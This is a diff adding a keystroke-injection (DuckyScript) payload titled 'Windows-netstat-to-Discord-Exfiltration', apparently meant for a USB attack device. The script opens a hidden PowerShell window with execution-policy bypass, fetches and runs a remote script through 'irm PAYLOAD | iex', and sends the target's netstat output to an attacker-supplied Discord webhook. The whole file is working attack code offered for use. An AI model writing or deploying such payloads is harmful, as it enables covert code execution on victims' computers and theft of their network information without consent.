@@ -1,0 +1,45 @@
+REM ###################################################################
+REM #                                                                 |
+REM # Title        : Windows-netstat-to-Discord-Exfiltration          |
+REM # Author       : Aleff                                            |
+REM # Version      : 1.0                                              |
+REM # Category     : Net, Exfiltration                                |
+REM # Target       : Windows 10-11                                    |
+REM #                                                                 |
+REM ###################################################################
+
+REM Title: Windows-netstat-to-Discord-Exfiltration
+REM Author: Aleff
+REM Description: Opens PowerShell hidden, grabs netstat status, saves as a cleartext in a variable and exfiltrates info via Discord Webhook.
+REM Put 1 on the function that you want to active, else 0. Functions available:
+REM - default (simple 'netstat' command)
+REM - routing_table $r
+REM - listening_canonical $lc
+REM - listening_numerical $ln
+REM - all_canonical $ac
+REM - all_numerical $an
+REM - offload ot
+REM - proto $p "<protocol>"
+REM - - In this option you must put the protocol that you want to monitor, for example $p="TCP" if you want to monitor TCP, else leave blank, so $p="".
+
+REM Target: Windows 10-11 (PowerShell)
+REM Version: 1.0
+REM Category: Net, Exfiltration
+REM Requirements: Internet connection
+REM 
+
+REM REQUIRED - Provide your Discord WEBHOOK
+DEFINE WEBHOOK https://discordapp.com/api/webhooks/<webhook_id>/<token>
+
+DELAY 2000
+GUI r
+DELAY 250
+DELETE
+STRING powershell -w h -ep bypass $discord='
+
+STRING WEBHOOK
+
+REM REQUIRED - Reply example.com with YOUR LINK. The Payload should be Windows-netstat.ps1
+DEFINE PAYLOAD example.com
+STRING ';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p='TCP';irm PAYLOAD | iex
+ENTER
